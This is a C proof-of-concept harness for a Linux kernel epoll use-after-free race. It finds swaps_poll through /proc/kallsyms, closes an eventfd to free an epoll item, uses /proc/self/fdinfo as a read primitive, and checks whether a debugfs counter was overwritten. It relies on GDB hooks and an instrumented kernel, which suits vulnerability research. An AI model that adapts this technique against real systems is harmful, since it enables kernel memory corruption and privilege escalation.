#include <sys/mount.h>
#include <sys/stat.h>
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/epoll.h>
#include <sys/eventfd.h>
#include <string.h>
#include <stdint.h>

uint64_t swaps_poll_addr = 0;

uint64_t get_kallsyms_address(const char *name) {
    FILE *f = fopen("/proc/kallsyms", "r");
    if (!f) return 0;
    char line[256];
    uint64_t addr = 0;
    while (fgets(line, sizeof(line), f)) {
        if (strstr(line, name)) {
            char type;
            char sym[128];
            if (sscanf(line, "%lx %c %s", &addr, &type, sym) == 3) {
                if (strcmp(sym, name) == 0) {
                    break;
                }
            }
        }
    }
    fclose(f);
    return addr;
}

uint64_t aar_read(int fd) {
    char buf[4096] = {0};
    if (fd < 0) return 0;
    int n = read(fd, buf, sizeof(buf) - 1);
    if (n > 0) {
        buf[n] = 0;
        printf("fdinfo read returned %d. buffer: %s\n", n, buf);
        if (strstr(buf, "ino:2f72657070617773")) {
            return 0x2f72657070617773;
        }
    }
    return 0;
}

int read_debugfs_counter() {
    char buf[128];
    int fd = open("/sys/kernel/debug/epoll_uaf/fep_cleared", O_RDONLY);
    if (fd < 0) return -1;
    int n = read(fd, buf, sizeof(buf)-1);
    close(fd);
    if (n > 0) {
        buf[n] = 0;
        return atoi(buf);
    }
    return -1;
}

int main(int argc, char **argv) {
    mkdir("/proc", 0755);
    mount("proc", "/proc", "proc", 0, NULL);
    mkdir("/sys", 0755);
    mount("sysfs", "/sys", "sysfs", 0, NULL);
    mount("debugfs", "/sys/kernel/debug", "debugfs", 0, NULL);
    printf("[*] Starting M5: Adjudicated ->poll Dispatch\n");
    fflush(stdout);

    swaps_poll_addr = get_kallsyms_address("swaps_poll");
    if (!swaps_poll_addr) {
        printf("[-] Failed to find swaps_poll\n");
        return 1;
    }
    printf("[*] Found swaps_poll at 0x%lx\n", swaps_poll_addr);
    fflush(stdout);

    int tmp_epA = epoll_create1(0);
    int tmp_epB = epoll_create1(0);
    struct epoll_event ev = {0};
    epoll_ctl(tmp_epA, EPOLL_CTL_ADD, tmp_epB, &ev);
    close(tmp_epA);
    close(tmp_epB);
    
    int before_val = read_debugfs_counter();
    printf("[*] Baseline ep_dbg_fep_cleared: %d\n", before_val);
    fflush(stdout);

    int epA = epoll_create1(0);
    int inner = eventfd(0, EFD_NONBLOCK);
    
    struct epoll_event ev_in = { .events = EPOLLIN, .data.fd = inner };
    epoll_ctl(epA, EPOLL_CTL_ADD, inner, &ev_in);
    
    uint64_t val = 1;
    write(inner, &val, 8); 
    
    char path[256];
    snprintf(path, sizeof(path), "/proc/self/fdinfo/%d", epA);
    int fdinfo_fd = open(path, O_RDONLY);
    if (fdinfo_fd < 0) {
        printf("[-] Failed to open fdinfo\n");
        return 1;
    }

    printf("[*] epA=%d, inner=%d. Waiting for GDB...\n", epA, inner);
    fflush(stdout);
    sleep(1);
    printf("[*] Triggering race by closing inner...\n");
    fflush(stdout);
    
    getpid(); // Enable __fput hook in GDB
    close(inner);
    
    printf("[*] RACE TRIGGERED. Waiting for RCU...\n");
    fflush(stdout);
    sleep(2);
    
    printf("[*] RCU finished. Triggering GDB injection...\n");
    fflush(stdout);
    getuid(); 
    
    uint64_t f_ino = aar_read(fdinfo_fd);
    if (f_ino != 0x2f72657070617773) {
        printf("[-] GATED SKIP: fdinfo read failed or wrong value (%lx).\n", f_ino);
        fflush(stdout);
        sleep(5);
        return 0;
    }
    printf("[+] GATED CHECK PASSED: 'swapper/' read.\n");
    fflush(stdout);

    printf("[*] Firing swaps_poll via epoll_wait...\n");
    fflush(stdout);
    struct epoll_event res_events[4];
    epoll_wait(epA, res_events, 4, 0);
    
    int after_val = read_debugfs_counter();
    printf("[+] Result ep_dbg_fep_cleared: %d (before: %d)\n", after_val, before_val);
    if (after_val == 0 && before_val != 0) {
        printf("[+] PASS: Counter was successfully overwritten to 0!\n");
    } else {
        printf("[-] FAIL: Counter was not overwritten.\n");
    }
    fflush(stdout);

    close(epA);
    sleep(5);
    return 0;
}
